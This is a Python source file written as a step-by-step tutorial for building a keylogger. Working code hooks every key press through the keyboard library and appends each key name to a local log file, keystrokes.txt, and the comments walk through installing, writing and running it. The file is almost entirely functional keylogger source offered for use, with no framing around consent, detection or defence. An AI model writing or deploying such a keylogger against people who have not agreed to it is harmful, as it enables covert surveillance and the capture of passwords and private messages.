# keylogger
# who to create a keylogger in python using code .. 
# -------------*********-----------*********---------
# frist 1: step command 
# Ensure that you have the keyboard library installed 
# in your Python environment. Open your command prompt or terminal

# pip install keyboard

# Step 2: Importing the Necessary Libraries
# Begin by importing the keyboard library at the beginning of your Python script.
# This library will enable us to work with keyboard inputs. 
#import keyboard

import keyboard

# Step 3: Define the Log File
# Specify the name and location of the log file where the keystrokes will be saved.
# In this example, we’ll use ‘keystrokes.txt’ as the file name. Feel free to modify it as desired.
# log_file = 'keystrokes.txt'

log_file = 'keystrokes.txt'

# Step 4: Create the Key Press Event Function
# Define a function that will handle the key press events.
# This function will be called whenever a key is pressed.
# def on_key_press(event):
# with open(log_file, 'a') as f:
# f.write('{}\n'.format(event.name))

def on_key_press(event):
    with open(log_file, 'a') as f:
        f.write('{}\n'.format(event.name))

# 
# Inside the function, the ‘with open’ statement opens the log file in ‘append’ mode (‘a’).
# It creates a temporary file object named ‘f’.
# The ‘write’ method writes the name of the pressed key, obtained from ‘event.name’, to the file.
# The ‘{}\n’.format(event.name) inserts the key name into the string,
# and the ‘\n’ ensures each key is written on a new line.

# Step 5: Register the Key Press Event
# Register the ‘on_key_press’ function to be called whenever a key is pressed.
# This will enable our code to capture the keystrokes. 
keyboard.on_press(on_key_press)

# Step 6: Wait for Key Presses
# Finally, we want our program to wait until a key is pressed before it exits.
# Use the ‘keyboard.wait()’ function to accomplish this.

keyboard.wait()

# Step 7: Run the Code
# Save your Python script with a ‘.py’ extension (e.g., ‘keylogger.py’).
# Open your command prompt or terminal, navigate to the directory where the script is located,
# and execute the command:

#python3 keylogger.py

